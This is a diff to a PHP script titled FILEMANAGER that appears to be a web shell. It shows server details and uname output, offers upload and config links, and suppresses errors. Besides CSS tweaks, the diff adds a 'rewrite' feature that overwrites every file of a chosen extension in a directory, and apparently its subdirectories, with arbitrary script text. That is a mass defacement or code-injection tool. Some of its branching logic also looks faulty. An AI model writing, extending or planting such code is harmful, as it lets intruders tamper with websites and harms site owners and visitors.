@@ -22,23 +22,19 @@ body {
 }
 
 table {
-  margin: 0;
   background:#fff;
-  padding: 10px;
-  border-spacing:0;
+  line-height: 40px;
+  border-collapse: separate;
+  border-spacing: 0;
+  border: 25px solid #fff;
   width: 70%;
-  border-radius:10px;
-  box-shadow: 0 3px 6px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
+  border-radius: 20px;
+  box-shadow: 0px 0px 0px 6px rgba(222,222,222,0.73);
 }
 
-table caption {
-  font-size: 1.5em;
-  margin: .5em 0 .75em;
-}
 
 table tr {
     border: 1px solid red;
-    padding: .35em;
   }
 
   table th {
@@ -48,7 +44,6 @@ table tr {
 
 table td {
 	padding: .625em;
-	border-bottom: 1px solid #e8e8e8;
 }
 
 table th {
@@ -112,6 +107,7 @@ select {
 }
 td.not {
 	border-bottom:none;
+	padding:0px;
 }
 td.yes {
 	border-bottom: 2px solid #e8e8e8;
@@ -328,7 +324,7 @@ a.l {
 	border-left:2px solid #e8e8e8;
 }
 td.mas {
-	padding:3px 10px;
+	padding:0px 2px;
 }
 td.sup {
 	width:0.1px;
@@ -350,9 +346,13 @@ td.check {
 	width:1px;
 }
 a.tool {
-	background: #e8e8e8;
-	padding:4px 7px;
-	border-radius:3px;
+	font-family: 'Ubuntu Mono', monospace;
+  	padding:7px 20px;
+  	outline:none;
+  	color:#8a8a8a;
+  	border-radius:20px;
+  	border:1px solid rgba(222,222,222,0.73);
+  	background:rgba(222,222,222,0.73);
 }
 div.tool {
 	margin-top:7px;
@@ -364,9 +364,23 @@ a.pwd {
   table {
   margin: 0;
   background:#fff;
-  padding: 10px;
+  padding:0px;
   width: 100%;
-  border-radius:10px;
+  border: 1px solid #fff;
+  box-shadow:none;
+}
+a.tool {
+	font-family: 'Ubuntu Mono', monospace;
+  	padding:5px 15px;
+  	outline:none;
+  	color:#8a8a8a;
+  	font-size:12.8px;
+  	border-radius:20px;
+  	border:1px solid rgba(222,222,222,0.73);
+  	background:rgba(222,222,222,0.73);
+}
+td.not {
+	padding:0px;
 }
 .icon {
 	width:20px;
@@ -376,7 +390,7 @@ select {
 	padding:3px;
 }
 .strong {
-	font-size:12px;
+	font-size:10px;
 }
 div.act {
 	width:95.5%;
@@ -462,28 +476,32 @@ function upload_show(id, text, btn) {
 <center>
 <table>
 <thead>
-	<tr>
-		<td colspan="5" class="yes" onclick="hide()">FILEMANAGER</td>
-	</tr>
-	<tr>
-		<td class="yes" colspan="5">
-			<div id='hide'>
-				<span class="strong">Server IP : <?=isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:$_SERVER["HTTP_HOST"]?></span><br>
-				<span class='strong' style='color:green;'><?=php_uname()?></span><br>
-				<span class="strong"><?=getenv('SERVER_SOFTWARE')?></span><br>
-				<span class="strong">Current Dir : <?=pwd()?></span><br>
-				<div>
-					<div class="tool">
-						<a class="tool" href="http://<?=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']?>">HOME</a>
-						<a class="tool" href="?path=<?=cwd()?>&upload" onclick="upload_show('answer1', 	this); return false;">UPLOAD</a>
-						<a class="tool" href="#!config">CONFIG</a>
-						<a class="tool" href="#!music">MUSIC</a>
-						<a class="tool" href="#!rewrite">REWRITE</a>
-					</div>
-				</div>
+    </tr>
+    <tr>
+    	<td colspan="5" class="not">
+    		<center>
+    			<span class='strong'> System : <?=php_uname()?></span>
+    		</center>
     	</td>
     </tr>
-    </div>
+    <tr>
+    	<td colspan="5" class="not">
+    		<center>
+    			<a class="tool" href="http://<?=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']?>">HOME</a>
+				<a class="tool" href="?path=<?=cwd()?>&upload" onclick="upload_show('answer1', 	this); return false;">UPLOAD</a>
+				<a class="tool" href="#!config">CONFIG</a>
+				<a class="tool" href="#!music">MUSIC</a>
+				<a class="tool" href="?path=<?=cwd()?>&rewrite">REWRITE</a>
+    		</center>
+    	</td>
+    </tr>
+    <tr>
+    	<td colspan="5" class="yes">
+    		<center>
+    			<span class="strong"><?= pwd() ?> ( <?= permission(cwd(), perms(cwd())) ?> )</span>
+    		</center>
+    	</td>
+    </tr>
 </thead>
 <?php
 error_reporting(0);
@@ -498,13 +516,13 @@ function cwd() {
 function pwd() {
 	$pwd = explode('/', cwd());
 	foreach ($pwd as $key => $value) {
-		print("<a class='tool pwd' href='?path=");
+		print("<a href='?path=");
 		for ($i=0; $i <= $key ; $i++) { 
 			print($pwd[$i]);
 			if ($i != $key) {
 				print("/");
 			}
-		} print("'>{$value}</a>");
+		} print("'>{$value}</a>/");
 	}
 }
 function perms($file) {
@@ -862,7 +880,62 @@ if (@$_GET['act'] == 'img') {
 	<?php
 	exit();
 }
-
+if (isset($_GET['rewrite'])) {
+	?>
+	<form method="post">
+		<tr>
+			<td class="not">
+				<input style="width:96.9%;" class="action" type="text" name="dir" value="<?=cwd()?>">
+			</td>
+		</tr>
+		<tr>
+			<td class="not">
+				<input style="width:96.9%;" class="action" type="text" name="type" placeholder="type ext : php, if you want execute all please empty this">
+			</td>
+		</tr>
+		<tr>
+			<td class="not">
+				<textarea style="width:95%;" name="text" placeholder="put your script or text"></textarea>
+			</td>
+		</tr>
+		<tr>
+			<td class="not">
+				<input style="width:100%;" type="submit" name="submit" value="REWRITE">
+			</td>
+		</tr>
+	</form>
+	<?php
+	if (isset($_POST['submit'])) {
+		rewrite($_POST['dir'], $_POST['type'], $_POST['text']);
+	}
+	exit();
+}
+function rewrite($dir, $type, $text) {
+    if(is_writable($dir)) {
+        $getfile = scandir($dir);
+        foreach($getfile as $file) {
+            $path = $dir.DIRECTORY_SEPARATOR.$file;
+            if($file === '.' || filetype($path) == 'file') {
+                if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)):
+                	alert("success", "rewrite ".cwd().DIRECTORY_SEPARATOR."{$file}");
+                	file_put_contents($path, $text);
+                endif;
+            } elseif($file === '..' || filetype($path) == 'file') {
+                if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)):
+                    alert("success", "rewrite ".cwd().DIRECTORY_SEPARATOR."{$file}");
+                file_put_contents($path, $text);
+                endif;
+            } else {
+                if(is_dir($path)) {
+                    if(is_writable($path)) {
+                        @file_put_contents($path, $text);
+                        masswrite($path,$type,$text);
+                    }
+                }
+            }
+        }
+    }
+}
 function download($file) {
   if (file_exists($file)) {
      if(ini_get('zlib.output_compression')) { 
@@ -1364,6 +1437,8 @@ if (isset($_GET['edit'])) {
   	foreach ($scandir as $dir) {
   		if (!is_dir($dir) || $dir === '.')continue;
   			if ($dir === '..') {
+  				?>
+  				<?php
   				$back = "<td class='check'>
   							<label class='container'>
   							<input type='checkbox' onchange='checkAll(this)'>
